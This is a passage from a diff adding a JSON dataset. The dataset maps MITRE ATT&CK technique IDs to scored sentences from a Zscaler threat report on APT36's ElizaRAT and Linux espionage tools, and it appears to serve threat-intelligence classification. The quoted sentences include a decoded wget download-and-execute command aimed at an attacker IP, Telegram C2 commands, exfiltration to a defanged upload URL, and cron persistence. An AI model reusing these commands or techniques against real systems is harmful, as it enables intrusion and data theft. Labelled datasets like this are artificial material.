+        "score": 0.484
+      },
+      {
+        "sentence": "This JSON data has details about the windows and tabs in the current live Firefox session. - Iterates over every tab in every Firefox window, extracting the title and the URL from each tab.",
+        "score": 0.3524
+      },
+      {
+        "sentence": "Then, the code checks if they match any value in the predefined list mentioned earlier. - If and when it finds a match, the code archives the ~/.mozilla/firefox directory content into the /dev/shm/firefox.zip ZIP archive. - Uploads the ZIP archive to hxxp://baseuploads[.]com/myf/test.php in an HTTP POST request.",
+        "score": 0.3941
+      },
+      {
+        "sentence": "Reasons for New Linux-Based Attack Vectors Why is APT36 suddenly adding new attack vectors for the Linux environment? - Historic and widespread usage of Linux in the Indian government sector: Linux-based operating systems are widely used in the Indian government sector.",
+        "score": 0.3609
+      },
+      {
+        "sentence": "The Debian-based operating system, BOSS (Bharat Online Software Solution), developed by CDAC is used across various state ministries and even the Indian defense forces.",
+        "score": 0.3207
+      },
+      {
+        "sentence": "For more details about the usage of Linux Boss in India, visit the Ministry of Electronics & Information Technology. - Expanding into government-related verticals: The recent announcement by the Indian government introduces Maya OS, a Debian Linux-based operating system that will replace Microsoft Windows OS across government and defense sectors.",
+        "score": 0.4011
+      },
+      {
+        "sentence": "Consequently, there is now a substantial incentive for APT36 and other nation-state threat actors, known for targeting India, to incorporate new attack vectors and Linux payloads into their arsenal.",
+        "score": 0.3511
+      },
+      {
+        "sentence": "Threat Attribution We attribute these new Windows and Linux-based attacks to APT36 because their method of serving decoy PDF files, the metadata and their Linux commands are almost identical to previous attacks, which are known and linked to APT36.",
+        "score": 0.4858
+      },
+      {
+        "sentence": "In addition to this, there is also a C2 infrastructure overlap with previous APT36 attacks which we describe in more detail in the corresponding section.",
+        "score": 0.3509
+      },
+      {
+        "sentence": "Decoy PDF files The decoy PDF file which is dropped in the same directory as the malicious DLL on the victim's machine by ElizaRAT.",
+        "score": 0.4986
+      },
+      {
+        "sentence": "The metadata of this PDF file indicated the author as \"Apolo Jones\" and the PDF file itself was generated with Microsoft Office Word.",
+        "score": 0.4316
+      },
+      {
+        "sentence": "Both these indicators align with our technical analysis of APT36 from November of 2022.",
+        "score": 0.3025
+      },
+      {
+        "sentence": "In addition to this, the decoy PDF files downloaded from the attacker-controlled servers in the campaign targeting the Linux platform share the same metadata as well.",
+        "score": 0.5635
+      },
+      {
+        "sentence": "Linux commands While the attack vector used to distribute the Linux payload is entirely new in this campaign, the Linux commands and file paths used in the desktop entry files share similarities with the previous APT36 campaign used to distribute Linux payloads.",
+        "score": 0.6103
+      },
+      {
+        "sentence": "In March 2023, APT36 used a Python-compiled ELF binary to target the Linux environment in the Indian government sector.",
+        "score": 0.4561
+      },
+      {
+        "sentence": "You can read about it on the Uptycs blog.",
+        "score": 0.3253
+      },
+      {
+        "sentence": "By comparing the Linux commands used in the decompiled Python code in March 2023 and the Linux commands used in the latest desktop entry files (in August 2023), we can see a clear similarity.",
+        "score": 0.5638
+      },
+      {
+        "sentence": "The figure below shows a side-by-side comparison of the two.",
+        "score": 0.3971
+      },
+      {
+        "sentence": "Figure 12: A side-by-side comparison of Linux commands from the March 2023 and August 2023 campaigns executed by APT36.",
+        "score": 0.3907
+      },
+      {
+        "sentence": "Here is a list of similarities between both cases: - A hidden directory path structure is created in the location: ~/.local/share . - A short shell script responsible for rebooting the machine and executing the Linux payload is written to /dev/shm/ . - The same crontab command is executed. - The shell script is deleted. - The sequence of commands is similar.",
+        "score": 0.473
+      },
+      {
+        "sentence": "Threat Actor Infrastructure In the APT36 attacks observed since April 2023, the threat actor has taken extensive measures to conceal any connection to Pakistan by making it seem that the infrastructure is controlled by a threat actor in India.",
+        "score": 0.4192
+      },
+      {
+        "sentence": "We assess, with a high-confidence, that this is not a coincidence but rather an intentional deception tactic used by APT36 to avoid the attacks from being attributed to Pakistan.",
+        "score": 0.3881
+      },
+      {
+        "sentence": "Registrant Country of C2 Domains Beginning in June 2023, the threat actor started registering several domains on a server with the IP address 153.92.220.59.",
+        "score": 0.4087
+      },
+      {
+        "sentence": "This infrastructure was involved in the attacks distributing malicious Linux desktop entry files discussed earlier.",
+        "score": 0.5512
+      },
+      {
+        "sentence": "While the WHOIS information for all these domains is redacted, we can still see the registrant country.",
+        "score": 0.3051
+      },
+      {
+        "sentence": "For most of the domains, the threat actor took sufficient measures to ensure the registrant country is India (IN).",
+        "score": 0.3271
+      },
+      {
+        "sentence": "However, for one of the domains, admindesk[.]in, we can see the registrant country is PK (Pakistan).",
+        "score": 0.4104
+      },
+      {
+        "sentence": "The figure below shows examples of WHOIS information for two of the domains registered by the threat actor on the same infrastructure and used in the same attack.",
+        "score": 0.3269
+      },
+      {
+        "sentence": "Figure 13: A side-by-side comparison of the WHOIS info from two attacker-registered domains related to same campaign and infrastructure.",
+        "score": 0.3212
+      },
+      {
+        "sentence": "We believe this was an OPSEC mistake by the threat actor.",
+        "score": 0.3464
+      },
+      {
+        "sentence": "C2 Infrastructure Overlap There is a C2 infrastructure overlap between the latest campaign and the previous instances of attacks by APT36. - In 2022, the server with IP address 153.92.220[.]48 was used to host the domains below which are registered by APT36: - Govscholarships[.]in - Kavach-apps[.]com - Kavach-app[.]in - Rodra[.]in - ksboard[.]in - In the latest instance, a server with IP address: 153.92.220[.]59 was used to host the C2 domains.",
+        "score": 0.466
+      },
+      {
+        "sentence": "Email Associated with Malicious Google Drive Links ElizaRAT is distributed using malicious Google Drive links.",
+        "score": 0.4288
+      },
+      {
+        "sentence": "Leveraging the Google Drive ID from the links, we gathered additional information about the owner of the Google Drive and the corresponding email address.",
+        "score": 0.322
+      },
+      {
+        "sentence": "The email address and owner name associated with the Google Drive link was: - Email address: [email protected] - Owner namer: \"Nand Kishore\" Because “Nand Kishore” is a common name in India, the fake owner was added to implicate a threat actor from India, not Pakistan - where APT36 originates.",
+        "score": 0.3871
+      },
+      {
+        "sentence": "Attacker-Controlled Server IP Addresses In a few instances, threat actors distributed malicious Linux desktop entry files where the embedded payloads were hosted on servers located in India.",
+        "score": 0.5644
+      },
+      {
+        "sentence": "Here is a list of the IP addresses of four servers hosting the malicious Linux payloads: - 103.2.232[.]82 - 64.227.133[.]222 - 64.227.138[.]127 - 134.209.159[.]9 Top Level Domain (TLDs) of Malicious Domains In all of the attacks we reviewed for this blog, the TLD was always set to .in - corresponding with the country of India.",
+        "score": 0.5019
+      },
+      {
+        "sentence": "Another tactic used by APT36 in a few cases is to disguise bad URLs as official Indian government-related web addresses.",
+        "score": 0.3569
+      },
+      {
+        "sentence": "Conclusion Our research team is actively monitoring the C2 infrastructure of APT36, which is used to register new domains that are used in attacks targeting the Linux environment.",
+        "score": 0.4083
+      },
+      {
+        "sentence": "The infrastructure continues to be active at the time of this blog publication.",
+        "score": 0.3107
+      },
+      {
+        "sentence": "We have included a comprehensive list of indicators of compromise (IOCs) at the end of this blog and we urge the research community to update their detection.",
+        "score": 0.3691
+      },
+      {
+        "sentence": "APT36’s introduction of new file formats, new attack vectors, and a new backdoor to the arsenal suggests that they are actively updating their tactics, techniques, and procedures (TTPs).",
+        "score": 0.3751
+      },
+      {
+        "sentence": "Zscaler Coverage Zscaler's multilayered cloud security platform detects indicators at various levels. - Win32.RAT.ElizaRAT - Win64.RAT.ElizaRAT - Linux.Payload.GLOBSHELL - Linux.Payload.PYSHELLFOX - Linux.Backdoor.Mythic The image below shows the sandbox detection for the new Windows RAT (ElizaRAT) used in the attack.",
+        "score": 0.3797
+      },
+      {
+        "sentence": "Zscaler assumes no responsibility for any errors or omissions or for any actions taken based on the information provided.",
+        "score": 0.3013
+      },
+      {
+        "sentence": "Any third-party websites or resources linked in this blog post are provided for convenience only, and Zscaler is not responsible for their content or practices.",
+        "score": 0.3569
+      },
+      {
+        "sentence": "All content is subject to change without notice.",
+        "score": 0.3225
+      },
+      {
+        "sentence": "By accessing this blog, you agree to these terms and acknowledge your sole responsibility to verify and use the information as appropriate for your needs.",
+        "score": 0.3132
+      }
+    ],
+    "T1567.002": [
+      {
+        "sentence": "Zscaler Blog Get the latest Zscaler blog updates in your inbox A peek into APT36’s updated arsenal Introduction In July 2023, Zscaler ThreatLabz discovered new malicious activity perpetuated by the Pakistan-based advanced persistent threat group (APT36).",
+        "score": 0.3587
+      },
+      {
+        "sentence": "APT36 is a sophisticated cyber threat group with a history of conducting targeted espionage operations in South Asia.",
+        "score": 0.3195
+      },
+      {
+        "sentence": "We observed APT36 targeting Indian government sectors using a previously undocumented Windows RAT, new cyber espionage utilities for Linux, new distribution mechanisms, and a new attack vector used against the Linux environment.",
+        "score": 0.384
+      },
+      {
+        "sentence": "Key Takeaways - Updated arsenal of APT36: The threat actor has resurfaced with a fresh, fully functional Windows remote administration tool (RAT), novel tools for cyber espionage on Linux systems, innovative distribution methods, and additional attack vectors. - New Windows RAT: A custom RAT, referred to as ElizaRAT, has been incorporated into the APT36 toolkit.",
+        "score": 0.4136
+      },
+      {
+        "sentence": "They chose the infrastructure and artifacts meticulously to make it appear as though the activities were conducted in India. - Reuse of infrastructure: In some cases, the same C2 infrastructure is being used by APT36 for both credential phishing attacks and distributing malicious binaries.",
+        "score": 0.3811
+      },
+      {
+        "sentence": "ElizaRAT is distributed as .NET binaries sent inside password-protected archive files hosted on Google Drive links.",
+        "score": 0.3768
+      },
+      {
+        "sentence": "To the best of our knowledge, we believe this is the first time APT36 has weaponized the CPL file format. - The binaries are large in size - ranging from 4MB to 16MB. - The Costura .NET framework was used to embed the essential .NET assemblies inside the main malware which resulted in the inflation of binary sizes. - The Telegram API was used for C2 communication.",
+        "score": 0.4545
+      },
+      {
+        "sentence": "Figure 1: The MainAsync() method used to start the malicious activities on the endpoint.",
+        "score": 0.3287
+      },
+      {
+        "sentence": "Logging Operation Each execution result is logged on both the endpoint (client-side) and the Telegram bot (server-side).",
+        "score": 0.3584
+      },
+      {
+        "sentence": "The code below shows that logging is done at the local and remote level. | // remote logging in Telegram bo await Communication.send_message(\"Username Created with name : \" + TextSource.Settings._username); // local logging on the infected endpoint File.AppendAllText(TextSource.Settings.log_p, \"username created local\\n\"); | Unique Identifier Generation A UUID and username are generated for each infected machine so that the threat actor can uniquely identify the victim.",
+        "score": 0.3362
+      },
+      {
+        "sentence": "C2 Command Format Since the threat actor uses the same Telegram bot to manage multiple infected endpoints, they use a specific C2 command format to synchronize the operations and ensure that a given command executes only on the intended endpoint.",
+        "score": 0.4861
+      },
+      {
+        "sentence": "The C2 command format looks like this: C2 Commands All C2 commands are handled in a switch-case statement by the Bot_OnMessage() method inside the Communicate class.",
+        "score": 0.4533
+      },
+      {
+        "sentence": "Before the execution of any command, the RAT extracts the username from the C2 command and compares it with the infected machine's username.",
+        "score": 0.3183
+      },
+      {
+        "sentence": "The following C2 commands are supported by the bot: | C2 COMMAND | FUNCTIONALITY | |---|---| | /dir | Fetches the list of files in the specified directory. | | /upload | Uploads the specified file from the victim’s machine. | | /getprocess | Gets the list of processes running on the victim’s machine.",
+        "score": 0.4624
+      },
+      {
+        "sentence": "The list is returned in a file with the name getproc.dll . | | /run | Executes the specified program on the victim’s machine. | | /delete | Deletes the specified file. | | /end | Kills the specified processes on the victim’s machine. | | /online | Checks whether the infected machine is online. | | /identity | Connects to the specified website from the victim’s machine and sends a response to the threat actor.",
+        "score": 0.4345
+      },
+      {
+        "sentence": "The image below shows the code used to create this shortcut file.",
+        "score": 0.3162
+      },
+      {
+        "sentence": "The name of the shortcut file is fetched from the \"orig_name\" setting defined in the config.",
+        "score": 0.3317
+      },
+      {
+        "sentence": "This attack vector is fairly new and appears to be utilized in very low-volume attacks.",
+        "score": 0.3482
+      },
+      {
+        "sentence": "We notified NIC in May 2023 about this website and the associated threat intel.",
+        "score": 0.4128
+      },
+      {
+        "sentence": "We also noticed that the same phishing website was using the hxxps://email9ov[.]in/VISIT_OF_MEDICAL URL to redirect visitors to the hxxp://103.2.232[.]82:8081/Tri-Service-Exercise/Delegation_Saudi_Arabia.zip URL.",
+        "score": 0.3284
+      },
+      {
+        "sentence": "The base64-encoded command present inside the desktop entry file decodes to: | /usr/bin/wget 'hxxp://103.2.232[.]82:8081/Tri-Service-Exercise/Delegation_Saudi_Arabia.pdf' -O /tmp/Delegation_Saudi_Arabia.pdf; /usr/bin/wget 'hxxp://103.2.232[.]82:8081/ISEPC-12-2023-Agenda-for-meeting/185' -O /tmp/185.elf; cd /tmp; chmod +x 185.elf;libreoffice /tmp/Delegation_Saudi_Arabia.pdf | ./185 | The command decoded above performs the following actions: 1.",
+        "score": 0.3333
+      },
+      {
+        "sentence": "Downloads the Linux payload and saves it in the /tmp directory with the filename: 185.elf .",
+        "score": 0.3053
+      },
+      {
+        "sentence": "Since it did not contain a fully functional C2 mechanism at the time of analysis, we believe it was still in a development phase and used by the threat actor as an initial test.",
+        "score": 0.5236
+      },
+      {
+        "sentence": "To read about “Lee” agent’s cross-platform capabilities, visit the Lumen blog.",
+        "score": 0.3369
+      },
+      {
+        "sentence": "Inflated File Attack - June 2023 Beginning in June 2023, we detected APT36 establishing their operational infrastructure on a server with the IP address 153.92.220.59.",
+        "score": 0.4818
+      },
+      {
+        "sentence": "Further insight into this attacker-controlled infrastructure is available in the Threat Actor Infrastructure section.",
+        "score": 0.5262
+      },
+      {
+        "sentence": "In August, we noted a significant development where few of these domains served as the hosting platform for decoy PDF files.",
+        "score": 0.3893
+      },
+      {
+        "sentence": "Figure 7 shows that the icon of this desktop file is set to application-pdf which is done to disguise the malware as an innocuous file. - Creates a hidden directory path called, local/share, in the user's home directory. - Downloads the Linux payload from the URL 64.227.133[.]222/zswap-xbusd using wget.",
+        "score": 0.3093
+      },
+      {
+        "sentence": "Saves it as zswap-xbusd in the previously created hidden directory. - Writes a short shell script to the file /dev/shm/myc.txt.",
+        "score": 0.3009
+      },
+      {
+        "sentence": "At the time of our analysis, the server 64.227.133[.]222 was not serving the Linux payload.",
+        "score": 0.3783
+      },
+      {
+        "sentence": "We continued monitoring this infrastructure and noticed that on Aug 29, 2023, a new domain called admin-br[.]in was registered and used to distribute a new Linux desktop entry file.",
+        "score": 0.3627
+      },
+      {
+        "sentence": "In this instance, we were able to retrieve the payloads and conclude the threat attribution to APT36.",
+        "score": 0.4062
+      },
+      {
+        "sentence": "Since Mythic is an open-source framework that is well-documented on GitHub, we will not explore its technical details in this blog.",
+        "score": 0.333
+      },
+      {
+        "sentence": "The corresponding C2 servers extracted from each malicious Linux payload are listed below. | C2 IP ADDRESS | PORT | |---|---| | 108.61.163[.]195 | 7443 | | 64.176.40[.]100 | 7443 | The C2 panel for Mythic Poseidon can be accessed by visiting the URI path /new/login on the server running at port 7443.",
+        "score": 0.498
+      },
+      {
+        "sentence": "For instance, the C2 panel for 108.61.163[.]195 can be accessed at hxxps://108.61.163[.]195:7443/new/login .",
+        "score": 0.4303
+      },
+      {
+        "sentence": "Figure 9: The Mythic C2 panel for the Poseidon binary.",
+        "score": 0.4282
+      },
+      {
+        "sentence": "New Python-Based Cyber Espionage Utilities Targeting Linux During our analysis, we also discovered new Python-based ELF binaries used by APT36 for the purpose of cyber espionage.",
+        "score": 0.3353
+      },
+      {
+        "sentence": "In this section, we review two types of cyber espionage tools discovered by our research team.",
+        "score": 0.3833
+      },
+      {
+        "sentence": "GLOBSHELL - Custom-built File exfiltration Linux utility The espionage tool under analysis includes this metadata: - MD5 hash: 3c3c9303ae33f3bae2e139dbb1db838e - Filename: rcu-tasks-kthread This ELF binary was compiled using PyInstaller.",
+        "score": 0.5525
+      },
+      {
+        "sentence": "The list of file extensions includes various types like image files, MS Office files, LibreOffice, and PDF. - Once the list of files is built, it copies the files to a hidden directory in the path: ~/.config/bossconfig/usnconfig/ - The content inside this directory is archived into a ZIP file called usnconfig.zip . - Data is exfiltrated to the URL hxxp://baseuploads[.]com/myf/test.php in an HTTP POST request.",
+        "score": 0.6524
+      },
+      {
+        "sentence": "Along with the ZIP file, the machine's username, hostname, and the current timestamp are sent.",
+        "score": 0.3605
+      },
+      {
+        "sentence": "However, this binary included a more in-depth predefined list of file extensions and file paths which it scans to exfiltrate files.",
+        "score": 0.5055
+      },
+      {
+        "sentence": "This JSON data has details about the windows and tabs in the current live Firefox session. - Iterates over every tab in every Firefox window, extracting the title and the URL from each tab.",
+        "score": 0.3214
+      },
+      {
+        "sentence": "Then, the code checks if they match any value in the predefined list mentioned earlier. - If and when it finds a match, the code archives the ~/.mozilla/firefox directory content into the /dev/shm/firefox.zip ZIP archive. - Uploads the ZIP archive to hxxp://baseuploads[.]com/myf/test.php in an HTTP POST request.",
+        "score": 0.4745
+      },
+      {
+        "sentence": "In addition to uploading the data, the code also uploads the username, hostname, and current timestamp.",
+        "score": 0.5189
+      },
+      {
+        "sentence": "Threat Attribution We attribute these new Windows and Linux-based attacks to APT36 because their method of serving decoy PDF files, the metadata and their Linux commands are almost identical to previous attacks, which are known and linked to APT36.",
+        "score": 0.3299
+      },
+      {
+        "sentence": "In addition to this, there is also a C2 infrastructure overlap with previous APT36 attacks which we describe in more detail in the corresponding section.",
+        "score": 0.5636
+      },
+      {
+        "sentence": "The metadata of this PDF file indicated the author as \"Apolo Jones\" and the PDF file itself was generated with Microsoft Office Word.",
+        "score": 0.3375
+      },
+      {
+        "sentence": "Both these indicators align with our technical analysis of APT36 from November of 2022.",
+        "score": 0.4021
+      },
+      {
+        "sentence": "In addition to this, the decoy PDF files downloaded from the attacker-controlled servers in the campaign targeting the Linux platform share the same metadata as well.",
+        "score": 0.421
+      },
+      {
+        "sentence": "Linux commands While the attack vector used to distribute the Linux payload is entirely new in this campaign, the Linux commands and file paths used in the desktop entry files share similarities with the previous APT36 campaign used to distribute Linux payloads.",
+        "score": 0.3152
+      },
+      {
+        "sentence": "Threat Actor Infrastructure In the APT36 attacks observed since April 2023, the threat actor has taken extensive measures to conceal any connection to Pakistan by making it seem that the infrastructure is controlled by a threat actor in India.",
+        "score": 0.4028
+      },
+      {
+        "sentence": "We assess, with a high-confidence, that this is not a coincidence but rather an intentional deception tactic used by APT36 to avoid the attacks from being attributed to Pakistan.",
+        "score": 0.3052
+      },
+      {
+        "sentence": "Registrant Country of C2 Domains Beginning in June 2023, the threat actor started registering several domains on a server with the IP address 153.92.220.59.",
+        "score": 0.3769
+      },
+      {
+        "sentence": "While the WHOIS information for all these domains is redacted, we can still see the registrant country.",
+        "score": 0.3549
+      },
+      {
+        "sentence": "The figure below shows examples of WHOIS information for two of the domains registered by the threat actor on the same infrastructure and used in the same attack.",
+        "score": 0.3618
+      },
+      {
+        "sentence": "C2 Infrastructure Overlap There is a C2 infrastructure overlap between the latest campaign and the previous instances of attacks by APT36. - In 2022, the server with IP address 153.92.220[.]48 was used to host the domains below which are registered by APT36: - Govscholarships[.]in - Kavach-apps[.]com - Kavach-app[.]in - Rodra[.]in - ksboard[.]in - In the latest instance, a server with IP address: 153.92.220[.]59 was used to host the C2 domains.",
+        "score": 0.4632
+      },
+      {
+        "sentence": "Leveraging the Google Drive ID from the links, we gathered additional information about the owner of the Google Drive and the corresponding email address.",
+        "score": 0.4689
+      },
+      {
+        "sentence": "The image below shows the information we retrieved.",
+        "score": 0.3872
+      },
+      {
+        "sentence": "Figure 14: A Google Drive link details revealing owner information.",
+        "score": 0.5228
+      },
+      {
+        "sentence": "The email address and owner name associated with the Google Drive link was: - Email address: [email protected] - Owner namer: \"Nand Kishore\" Because “Nand Kishore” is a common name in India, the fake owner was added to implicate a threat actor from India, not Pakistan - where APT36 originates.",
+        "score": 0.3715
+      },
+      {
+        "sentence": "Attacker-Controlled Server IP Addresses In a few instances, threat actors distributed malicious Linux desktop entry files where the embedded payloads were hosted on servers located in India.",
+        "score": 0.3449
+      },
+      {
+        "sentence": "This tactic of using servers in the same region as the targeted country for mounting attacks is another deceptive technique employed by APT36.",
+        "score": 0.3695
+      },
+      {
+        "sentence": "Here is a list of the IP addresses of four servers hosting the malicious Linux payloads: - 103.2.232[.]82 - 64.227.133[.]222 - 64.227.138[.]127 - 134.209.159[.]9 Top Level Domain (TLDs) of Malicious Domains In all of the attacks we reviewed for this blog, the TLD was always set to .in - corresponding with the country of India.",
+        "score": 0.3731
+      },
+      {
+        "sentence": "Conclusion Our research team is actively monitoring the C2 infrastructure of APT36, which is used to register new domains that are used in attacks targeting the Linux environment.",
+        "score": 0.4198
+      },
+      {
+        "sentence": "The infrastructure continues to be active at the time of this blog publication.",
+        "score": 0.3987
+      },
+      {
+        "sentence": "We have included a comprehensive list of indicators of compromise (IOCs) at the end of this blog and we urge the research community to update their detection.",
+        "score": 0.3693
+      },
+      {
+        "sentence": "We have also done a proactive responsible disclosure to the National Informatics Centre (NIC), India with IOC details and the associated threat intelligence.",
+        "score": 0.3862
+      },
+      {
+        "sentence": "APT36’s introduction of new file formats, new attack vectors, and a new backdoor to the arsenal suggests that they are actively updating their tactics, techniques, and procedures (TTPs).",
+        "score": 0.3149
+      },
+      {
+        "sentence": "Disclaimer: This blog post has been created by Zscaler for informational purposes only and is provided \"as is\" without any guarantees of accuracy, completeness or reliability.",
+        "score": 0.3336
+      },
+      {
+        "sentence": "Any third-party websites or resources linked in this blog post are provided for convenience only, and Zscaler is not responsible for their content or practices.",
+        "score": 0.3438
+      },
+      {
+        "sentence": "By accessing this blog, you agree to these terms and acknowledge your sole responsibility to verify and use the information as appropriate for your needs.",
+        "score": 0.3317
+      },
+      {
+        "sentence": "Get the latest Zscaler blog updates in your inbox By submitting the form, you are agreeing to our privacy policy.",
+        "score": 0.3701
+      }
+    ],
+    "T1036": [
+      {
+        "sentence": "We observed APT36 targeting Indian government sectors using a previously undocumented Windows RAT, new cyber espionage utilities for Linux, new distribution mechanisms, and a new attack vector used against the Linux environment.",
+        "score": 0.3022
+      },
+      {
+        "sentence": "In this blog, we will examine the latest tools employed by APT36, which are designed to target both Windows and Linux operating systems.",
+        "score": 0.352
+      },
+      {
+        "sentence": "They chose the infrastructure and artifacts meticulously to make it appear as though the activities were conducted in India. - Reuse of infrastructure: In some cases, the same C2 infrastructure is being used by APT36 for both credential phishing attacks and distributing malicious binaries.",
+        "score": 0.3492
+      },
+      {
+        "sentence": "ElizaRAT is distributed as .NET binaries sent inside password-protected archive files hosted on Google Drive links.",
+        "score": 0.4099
+      },
+      {
+        "sentence": "During our threat analysis, we gathered several samples of ElizaRAT and they all shared these characteristics: - They are all .NET binaries that are compiled as Control Panel applets (CPL) and use the \".cpl\" file extension.",
+        "score": 0.4207
+      },
+      {
+        "sentence": "To the best of our knowledge, we believe this is the first time APT36 has weaponized the CPL file format. - The binaries are large in size - ranging from 4MB to 16MB. - The Costura .NET framework was used to embed the essential .NET assemblies inside the main malware which resulted in the inflation of binary sizes. - The Telegram API was used for C2 communication.",
+        "score": 0.3961
+      },
+      {
+        "sentence": "For this technical analysis, we use the following file metadata: - MD5 hash: fc99daa2e1b47bae4be51e5e59aef1f0 - Filename: AgendaMeeting.cpl Since this Windows RAT arrives on the endpoint in the form of a Control Panel applet, the first method called upon execution is CplApplet().",
+        "score": 0.4013
+      },
+      {
+        "sentence": "Inside this task, all important malicious operations are carried out.",
+        "score": 0.4243
+      },
+      {
+        "sentence": "The image below shows Program().Main() kick starting the malicious activities on the endpoint.",
+        "score": 0.3125
+      },
+      {
+        "sentence": "The username is the UUID without the \".cookie\" extension.",
+        "score": 0.3273
+      },
+      {
+        "sentence": "The list is returned in a file with the name getproc.dll . | | /run | Executes the specified program on the victim’s machine. | | /delete | Deletes the specified file. | | /end | Kills the specified processes on the victim’s machine. | | /online | Checks whether the infected machine is online. | | /identity | Connects to the specified website from the victim’s machine and sends a response to the threat actor.",
+        "score": 0.3079
+      },
+      {
+        "sentence": "The name of the shortcut file is fetched from the \"orig_name\" setting defined in the config.",
+        "score": 0.3701
+      },
+      {
+        "sentence": "In this case, the shortcut file is called TextSource.lnk.",
+        "score": 0.3094
+      },
+      {
+        "sentence": "The description of this shortcut file is set to \"Text Editing APP for Windows\" to disguise it as a text editing application, making it seem innocuous.",
+        "score": 0.5894
+      },
+      {
+        "sentence": "Displaying Decoy Content The method dosome() defined in the Program class is responsible for displaying the decoy PDF file to the user.",
+        "score": 0.3276
+      },
+      {
+        "sentence": "This decoy file is present inside the resources section of the .NET binary.",
+        "score": 0.4342
+      },
+      {
+        "sentence": "The image below shows the decoy file.",
+        "score": 0.3285
+      },
+      {
+        "sentence": "It is only used to distract the victim and make it appear that an error occurred when opening the file.",
+        "score": 0.3699
+      },
+      {
+        "sentence": "Malicious Linux Desktop Entry Files as New Attack Vectors The utilization of Linux desktop entry files by APT36 as an attack vector has never been documented before.",
+        "score": 0.375
+      },
+      {
+        "sentence": "So far, our research team has discovered three samples - all of which have 0 detection on VirusTotal.",
+        "score": 0.3124
+      },
+      {
+        "sentence": "We first observed an occurrence in May 2023 when a credential phishing website used to target Indian government employees was also found to be hosting a redirector to distribute ZIP archives containing malicious Linux desktop entry files.",
+        "score": 0.4225
+      },
+      {
+        "sentence": "National Informatics Center (NIC), India Phishing Attack - May 2023 In May 2023, we discovered a credential phishing site, email9ov[.]in, targeting Indian government officials by masquerading as the official login portal for National Informatics Center (NIC), India.",
+        "score": 0.3997
+      },
+      {
+        "sentence": "We also noticed that the same phishing website was using the hxxps://email9ov[.]in/VISIT_OF_MEDICAL URL to redirect visitors to the hxxp://103.2.232[.]82:8081/Tri-Service-Exercise/Delegation_Saudi_Arabia.zip URL.",
+        "score": 0.4166
+      },
+      {
+        "sentence": "From here, a visitor would download a ZIP archive containing a maliciously crafted Linux desktop entry file.",
+        "score": 0.4602
+      },
+      {
+        "sentence": "The base64-encoded command present inside the desktop entry file decodes to: | /usr/bin/wget 'hxxp://103.2.232[.]82:8081/Tri-Service-Exercise/Delegation_Saudi_Arabia.pdf' -O /tmp/Delegation_Saudi_Arabia.pdf; /usr/bin/wget 'hxxp://103.2.232[.]82:8081/ISEPC-12-2023-Agenda-for-meeting/185' -O /tmp/185.elf; cd /tmp; chmod +x 185.elf;libreoffice /tmp/Delegation_Saudi_Arabia.pdf | ./185 | The command decoded above performs the following actions: 1.",
+        "score": 0.3085
+      },
+      {
+        "sentence": "Downloads the decoy PDF and saves it in the /tmp directory with the filename: Delegation_Saudi_Arabia.pdf .",
+        "score": 0.354
+      },
+      {
+        "sentence": "Downloads the Linux payload and saves it in the /tmp directory with the filename: 185.elf .",
+        "score": 0.3358
+      },
+      {
+        "sentence": "Marks the Linux binary as executable.",
+        "score": 0.4827
+      },
+      {
+        "sentence": "In this case, the Linux payload was a cross-platform binary designed to run on both Linux and WSL (Windows Subsystem for Linux) machines.",
+        "score": 0.3595
+      },
+      {
+        "sentence": "The content inside the decoy PDF file is displayed in the image below.",
+        "score": 0.3475
+      },
+      {
+        "sentence": "In August, we noted a significant development where few of these domains served as the hosting platform for decoy PDF files.",
+        "score": 0.3782
+      },
+      {
+        "sentence": "These PDFs were linked within the malicious Linux desktop entry files, which the threat actor distributed enclosed in zip archives.",
+        "score": 0.4835
+      },
+      {
+        "sentence": "Here are some technical details about this case: - ZIP archive MD5 hash: 36b19ca8737c63b9c9a3365ff4968ef5 - ZIP filename: Meeting_agenda.zip - Desktop entry file MD5 hash: 65167974b397493fce320005916a13e9 - Desktop entry filename: approved_copy.desktop Desktop entry file analysis The first anomaly we observed was the large size of the Linux desktop entry file.",
+        "score": 0.4386
+      },
+      {
+        "sentence": "A size larger than 1 MB for a Linux desktop entry file is rare.",
+        "score": 0.3565
+      },
+      {
+        "sentence": "Reviewing the file revealed that the threat actor inflated the size of the file by adding more than a million \"#\" characters.",
+        "score": 0.4599
+      },
+      {
+        "sentence": "We believe this was an attempt by the threat actor to bypass security scanning solutions.",
+        "score": 0.3465
+      },
+      {
+        "sentence": "The image below shows the extra characters added to the inflated Linux desktop entry file.",
+        "score": 0.4081
+      },
+      {
+        "sentence": "Figure 6: The inflated Linux desktop entry file.",
+        "score": 0.4408
+      },
+      {
+        "sentence": "This decoy file contains an error message to distract the user.",
+        "score": 0.3844
+      },
+      {
+        "sentence": "Figure 7 shows that the icon of this desktop file is set to application-pdf which is done to disguise the malware as an innocuous file. - Creates a hidden directory path called, local/share, in the user's home directory. - Downloads the Linux payload from the URL 64.227.133[.]222/zswap-xbusd using wget.",
+        "score": 0.5538
+      },
+      {
+        "sentence": "Saves it as zswap-xbusd in the previously created hidden directory. - Writes a short shell script to the file /dev/shm/myc.txt.",
+        "score": 0.3565
+      },
+      {
+        "sentence": "The shell script reboots the machine and then launches the Linux payload. - Sets up a cron job under the current username to run the contents of the /dev/shm/myc.txt script. - Deletes the shell script. - Executes the Linux payload.",
+        "score": 0.3937
+      },
+      {
+        "sentence": "Figure 7: The icon of the desktop configuration file is set to PDF to make it more convincing.",
+        "score": 0.4873
+      },
+      {
+        "sentence": "We continued monitoring this infrastructure and noticed that on Aug 29, 2023, a new domain called admin-br[.]in was registered and used to distribute a new Linux desktop entry file.",
+        "score": 0.4327
+      },
+      {
+        "sentence": "The image below shows a decoy PDF file displaying an error message stating “Failed to load the PDF document”.",
+        "score": 0.3439
+      },
+      {
+        "sentence": "This is used to distract the user while malicious activities occur in the background.",
+        "score": 0.3928
+      },
+      {
+        "sentence": "In this case, the Linux desktop entry file retrieves the malicious Linux payloads from the servers at: - 64.227.138[.]127 - 134.209.159[.]9 The two files retrieved are cleverly named to disguise themselves as legitimate software utilities.",
+        "score": 0.5954
+      },
+      {
+        "sentence": "Here is the metadata of Linux payloads: - MD5 hash: 98279047a7db080129e5ec84533822ef - Filename: pickle-help - MD5 hash: 248d4e6bb0f32afd7a1cfb975910235a - Filename: ziputils-help A quick technical analysis determined these Linux payloads as Mythic Poseidon binaries.",
+        "score": 0.533
+      },
+      {
+        "sentence": "Since Mythic is an open-source framework that is well-documented on GitHub, we will not explore its technical details in this blog.",
+        "score": 0.3164
+      },
+      {
